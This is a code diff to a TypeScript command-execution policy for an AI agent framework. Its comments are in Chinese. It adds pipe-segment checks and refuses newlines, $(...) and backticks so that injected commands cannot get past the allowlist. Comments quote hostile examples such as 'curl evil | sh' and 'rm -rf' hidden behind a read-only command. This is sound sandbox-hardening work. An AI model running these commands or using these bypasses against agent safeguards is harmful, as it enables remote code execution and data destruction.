@@ -4,9 +4,10 @@
  *   1. 危险命令黑名单  — 即使 full 模式也阻止解释器/提权命令
  *   2. 环境变量前缀剥离 — `FOO=bar cmd` → 按 `cmd` 做白名单匹配
  *   3. Safe wrapper 剥离 — `timeout 10 cmd` → 按 `cmd` 做匹配
- *   4. 复合命令拆分   — `&&` `||` `;` 逐段独立检查，deny 优先
- *   5. 只读命令自动放行 — 与 file-policy classifyBashCommand 集成
- *   6. Owner 信号 — execApprovalMode=ask 时返回需审批（ZHIN_NEEDS_OWNER），由编排层可硬触发 ask_user
+ *   4. 复合命令拆分   — `&&` `||` `;` 与管道 `|` 逐段独立检查，deny 优先
+ *   5. Shell 语法 fail-closed — 非 full 模式拒绝含换行 / `$(...)` / 反引号的命令
+ *   6. 只读命令自动放行 — 与 file-policy classifyBashCommand 集成
+ *   7. Owner 信号 — execApprovalMode=ask 时返回需审批（ZHIN_NEEDS_OWNER），由编排层可硬触发 ask_user
  */
 
 import type { AgentTool } from '@zhin.js/ai';
@@ -156,14 +157,15 @@ export function stripSafeWrappers(command: string): string {
 
 /**
  * 将复合命令按 `&&`, `||`, `;` 拆分为独立子命令。
- * 管道 `|` 不拆分 — 管道中的只读性由 classifyBashCommand 判断。
+ * 管道 `|` 不在此拆分 — 由 checkExecPolicy 再用 splitPipeSegments 逐段检查。
  *
  * 引号/转义感知：单引号内为字面量；双引号与裸文本内 `\` 转义下一个字符；
  * 引号内的分隔符不拆分（`echo "a && b"` 是单命令）。
  * 引号未闭合时 fail-closed：整条按单命令返回（不拆分），
  * 避免把藏在残缺引号后的危险段漏检。
  *
- * 注意：不处理 subshell `$(...)` 和反引号 — 这些场景由危险黑名单覆盖。
+ * 注意：不处理换行、subshell `$(...)` 和反引号 — 这些语法超出策略理解范围，
+ * 由 checkExecPolicy 在非 full 模式下直接 fail-closed 拒绝（见 findUnsafeShellSyntax）。
  */
 export function splitCompoundCommand(command: string): string[] {
   const parts: string[] = [];
@@ -227,6 +229,127 @@ export function splitCompoundCommand(command: string): string[] {
   const tail = current.trim();
   if (tail) parts.push(tail);
   return parts;
+}
+
+/**
+ * 将命令按管道 `|` 拆分为独立段（`||` 不拆）。
+ * 引号/转义感知规则与 splitCompoundCommand 一致；引号未闭合时 fail-closed 返回整条。
+ *
+ * 用于逐段过白名单 — 防止 `cat x | rm -rf y`、`curl evil | sh`
+ * 这类以首命令命中白名单/只读预设的绕过。
+ */
+export function splitPipeSegments(command: string): string[] {
+  const parts: string[] = [];
+  let current = '';
+  let quote: 'single' | 'double' | null = null;
+  let escaped = false;
+  let i = 0;
+  while (i < command.length) {
+    const ch = command[i]!;
+    if (escaped) {
+      current += ch;
+      escaped = false;
+      i++;
+      continue;
+    }
+    if (ch === '\\' && quote !== 'single') {
+      current += ch;
+      escaped = true;
+      i++;
+      continue;
+    }
+    if (quote === 'single') {
+      if (ch === "'") quote = null;
+      current += ch;
+      i++;
+      continue;
+    }
+    if (quote === 'double') {
+      if (ch === '"') quote = null;
+      current += ch;
+      i++;
+      continue;
+    }
+    if (ch === "'") {
+      quote = 'single';
+      current += ch;
+      i++;
+      continue;
+    }
+    if (ch === '"') {
+      quote = 'double';
+      current += ch;
+      i++;
+      continue;
+    }
+    if (ch === '|' && command[i + 1] !== '|' && command[i - 1] !== '|') {
+      const trimmed = current.trim();
+      if (trimmed) parts.push(trimmed);
+      current = '';
+      i++;
+      while (i < command.length && /\s/.test(command[i])) i++;
+      continue;
+    }
+    current += ch;
+    i++;
+  }
+  if (quote !== null || escaped) return [command];
+  const tail = current.trim();
+  if (tail) parts.push(tail);
+  return parts;
+}
+
+/**
+ * 检测超出策略理解范围的 shell 语法，返回拒绝原因（安全则返回 undefined）。
+ *
+ * fail-closed 场景：
+ *  - 未加引号的换行 — `\n` 是命令分隔符，朴素分词会把 `cat a.txt\nrm -rf x` 整条当 cat
+ *  - 命令替换 `$(...)` 与反引号 — 可在任意参数位置藏入任意命令
+ *
+ * 单引号内为字面量，不判定；双引号内 `$(...)` / 反引号在 bash 中仍会展开，照样拒绝。
+ */
+export function findUnsafeShellSyntax(command: string): string | undefined {
+  let quote: 'single' | 'double' | null = null;
+  let escaped = false;
+  for (let i = 0; i < command.length; i++) {
+    const ch = command[i]!;
+    if (escaped) {
+      escaped = false;
+      continue;
+    }
+    if (ch === '\\' && quote !== 'single') {
+      escaped = true;
+      continue;
+    }
+    if (quote === 'single') {
+      if (ch === "'") quote = null;
+      continue;
+    }
+    if (ch === "'") {
+      quote = 'single';
+      continue;
+    }
+    if (quote === 'double') {
+      if (ch === '"') quote = null;
+      // 双引号内换行是字面量；`$(` 与反引号仍会展开，落到下方统一判定
+    } else {
+      if (ch === '"') {
+        quote = 'double';
+        continue;
+      }
+      // 裸文本中的换行是命令分隔符 — 策略无法逐行理解，fail-closed
+      if (ch === '\n' || ch === '\r') {
+        return '拒绝执行含换行的命令 — 换行可夹带额外命令，超出安全策略的理解范围。请拆分为单条命令逐次执行。';
+      }
+    }
+    if (ch === '`') {
+      return '拒绝执行含反引号命令替换的命令 — 该语法可嵌入任意命令，超出安全策略的理解范围。';
+    }
+    if (ch === '$' && command[i + 1] === '(') {
+      return '拒绝执行含 $(...) 命令替换的命令 — 该语法可嵌入任意命令，超出安全策略的理解范围。';
+    }
+  }
+  return undefined;
 }
 
 /**
@@ -504,32 +627,50 @@ export function checkExecPolicy(config: Required<ZhinAgentConfig>, command: stri
     return { allowed: false, reason: '命令为空' };
   }
 
+  // Fail-closed：换行 / $(...) / 反引号超出白名单与只读分类的理解范围。
+  // full 模式本就整体放行（仅黑名单兜底），不做额外限制。
+  if (security !== 'full') {
+    const unsafeReason = findUnsafeShellSyntax(cmd);
+    if (unsafeReason) {
+      try {
+        const auditLogger = getAuditLogger();
+        auditLogger.logExecPolicy(cmd, false, unsafeReason);
+      } catch {
+        // 忽略审计日志错误
+      }
+      return { allowed: false, reason: unsafeReason };
+    }
+  }
+
   // 拆分复合命令 — 每段独立检查，deny 优先
   const subCommands = splitCompoundCommand(cmd);
   let pendingApproval: ExecPolicyResult | null = null;
 
   for (const sub of subCommands) {
-    const cmdName = extractCommandName(sub);
-    if (!cmdName) continue;
+    // 管道逐段检查 — 防止 `cat x | rm -rf y`、`curl evil | sh` 以首命令命中白名单绕过
+    for (const segment of splitPipeSegments(sub)) {
+      const cmdName = extractCommandName(segment);
+      if (!cmdName) continue;
 
-    const result = checkSingleCommand(cmdName, sub, allowlist, security, approvalMode, requesterRole);
+      const result = checkSingleCommand(cmdName, segment, allowlist, security, approvalMode, requesterRole);
 
-    // deny 立即返回（deny > ask 优先级）
-    if (!result.allowed && !result.needsApproval) {
-      // 记录审计日志
-      try {
-        const auditLogger = getAuditLogger();
-        auditLogger.logExecPolicy(sub, false, result.reason);
-      } catch {
-        // 忽略审计日志错误
+      // deny 立即返回（deny > ask 优先级）
+      if (!result.allowed && !result.needsApproval) {
+        // 记录审计日志
+        try {
+          const auditLogger = getAuditLogger();
+          auditLogger.logExecPolicy(segment, false, result.reason);
+        } catch {
+          // 忽略审计日志错误
+        }
+
+        return result;
       }
 
-      return result;
-    }
-
-    // 记录第一个需要审批的
-    if (!result.allowed && result.needsApproval && !pendingApproval) {
-      pendingApproval = result;
+      // 记录第一个需要审批的
+      if (!result.allowed && result.needsApproval && !pendingApproval) {
+        pendingApproval = result;
+      }
     }
   }
 
